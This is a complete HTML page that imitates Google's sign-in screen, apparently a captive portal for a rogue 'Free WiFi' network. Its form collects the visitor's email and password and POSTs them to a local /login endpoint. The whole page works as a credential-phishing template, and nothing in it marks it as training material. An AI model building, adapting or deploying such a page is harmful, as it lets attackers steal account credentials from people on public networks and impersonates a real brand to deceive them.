<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in — Google</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: "Google Sans", Roboto, Arial, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 48px 24px;
    }
    .logo {
      margin-bottom: 32px;
      font-size: 28px;
      font-weight: 500;
      letter-spacing: -0.5px;
    }
    .logo .blue   { color: #4285F4; }
    .logo .red    { color: #EA4335; }
    .logo .yellow { color: #FBBC05; }
    .logo .green  { color: #34A853; }
    .card {
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 48px 40px 36px;
      max-width: 400px;
      width: 100%;
    }
    h1 { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
    .subtitle { font-size: 16px; color: #202124; margin-bottom: 32px; }
    .field {
      margin-bottom: 24px;
    }
    .field input {
      width: 100%;
      padding: 14px 12px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      color: #202124;
    }
    .field input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .field input::placeholder { color: #80868b; }
    .actions {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .btn {
      background: #1a73e8;
      color: #fff;
      border: none;
      border-radius: 4px;
      padding: 10px 24px;
      font-size: 14px;
      font-weight: 500;
      letter-spacing: 0.25px;
      cursor: pointer;
    }
    .btn:hover { background: #1765cc; }
    .btn:active { background: #1557b0; }
    .footer {
      margin-top: 24px;
      font-size: 12px;
      color: #5f6368;
      display: flex;
      gap: 24px;
    }
  </style>
</head>
<body>
  <div class="logo">
    <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="green">g</span><span class="blue">l</span><span class="red">e</span>
  </div>
  <div class="card">
    <h1>Sign in</h1>
    <p class="subtitle">to continue to Free WiFi</p>
    <form method="POST" action="/login">
      <div class="field">
        <input type="email" name="email" placeholder="Email or phone" required autofocus>
      </div>
      <div class="field">
        <input type="password" name="password" placeholder="Enter your password" required>
      </div>
      <div class="actions">
        <div></div>
        <button type="submit" class="btn">Next</button>
      </div>
    </form>
  </div>
  <div class="footer">
    <span>Help</span>
    <span>Privacy</span>
    <span>Terms</span>
  </div>
</body>
</html>
